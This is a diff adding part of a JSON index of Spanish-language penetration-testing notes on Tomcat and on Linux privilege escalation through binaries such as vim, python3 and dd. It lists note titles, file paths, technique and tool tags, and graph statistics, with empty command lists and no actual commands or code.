+      "label": "Tomcat",
+      "source_path": "Explotaciones/Tecnologias Explotadas/Tomcat.md",
+      "techniques": [],
+      "tools": [],
+      "services": [
+        "tomcat"
+      ],
+      "commands": []
+    },
+    {
+      "id": "abuso-de-binario-base64",
+      "label": "Abuso De Binario base64",
+      "source_path": "Escalada De Privilegios/Abuso De Binario base64.md",
+      "techniques": [],
+      "tools": [
+        "base64",
+        "sudo"
+      ],
+      "services": [],
+      "commands": []
+    },
+    {
+      "id": "abuso-de-binario-env",
+      "label": "Abuso de Binario Env",
+      "source_path": "Escalada De Privilegios/Abuso de Binario Env.md",
+      "techniques": [
+        "suid-abuse"
+      ],
+      "tools": [
+        "env"
+      ],
+      "services": [],
+      "commands": []
+    },
+    {
+      "id": "abuso-de-binario-grep",
+      "label": "Abuso de Binario Grep",
+      "source_path": "Escalada De Privilegios/Abuso de Binario Grep.md",
+      "techniques": [
+        "suid-abuse"
+      ],
+      "tools": [
+        "grep"
+      ],
+      "services": [],
+      "commands": []
+    },
+    {
+      "id": "abuso-de-binario-nano",
+      "label": "Abuso de Binario nano",
+      "source_path": "Escalada De Privilegios/Abuso de Binario nano.md",
+      "techniques": [],
+      "tools": [
+        "nano"
+      ],
+      "services": [],
+      "commands": []
+    },
+    {
+      "id": "abuso-de-binario-ruby",
+      "label": "Abuso de Binario Ruby",
+      "source_path": "Escalada De Privilegios/Abuso de Binario Ruby.md",
+      "techniques": [
+        "credential-extraction"
+      ],
+      "tools": [
+        "ruby"
+      ],
+      "services": [],
+      "commands": []
+    },
+    {
+      "id": "abuso-de-binario-vim",
+      "label": "Abuso de Binario Vim",
+      "source_path": "Escalada De Privilegios/Abuso de Binario Vim.md",
+      "techniques": [
+        "credential-extraction"
+      ],
+      "tools": [
+        "vim"
+      ],
+      "services": [],
+      "commands": []
+    },
+    {
+      "id": "abuso-de-procesos",
+      "label": "Abuso de Procesos",
+      "source_path": "Escalada De Privilegios/Abuso de Procesos.md",
+      "techniques": [
+        "process-abuse"
+      ],
+      "tools": [],
+      "services": [],
+      "commands": []
+    },
+    {
+      "id": "abuso-del-binario-dd",
+      "label": "Abuso Del Binario dd",
+      "source_path": "Escalada De Privilegios/Abuso Del Binario dd.md",
+      "techniques": [
+        "sudo-abuse"
+      ],
+      "tools": [
+        "dd",
+        "sudo"
+      ],
+      "services": [],
+      "commands": []
+    },
+    {
+      "id": "abuso-del-binario-node",
+      "label": "Abuso Del Binario Node",
+      "source_path": "Escalada De Privilegios/Abuso Del Binario Node.md",
+      "techniques": [],
+      "tools": [
+        "nodejs"
+      ],
+      "services": [],
+      "commands": []
+    },
+    {
+      "id": "abuso-del-binario-python3",
+      "label": "Abuso Del Binario Python3",
+      "source_path": "Escalada De Privilegios/Abuso Del Binario Python3.md",
+      "techniques": [
+        "sudo-abuse",
+        "suid-abuse"
+      ],
+      "tools": [
+        "python",
+        "sudo"
+      ],
+      "services": [
+        "jenkins"
+      ],
+      "commands": []
+    },
+    {
+      "id": "python-library-hijacking",
+      "label": "Python Library Hijacking",
+      "source_path": "Escalada De Privilegios/Python Library Hijacking.md",
+      "techniques": [
+        "python-library-hijacking"
+      ],
+      "tools": [
+        "python"
+      ],
+      "services": [],
+      "commands": []
+    }
+  ],
+  "stats": {
+    "machines": 26,
+    "techniques": 22,
+    "tools": 32,
+    "services": 14,
+    "vulnerabilities": 7,
+    "privilege_methods": 5,
+    "edges_machine_technique": 187,
+    "edges_machine_tool": 193,
+    "edges_machine_service": 102
+  }
+}
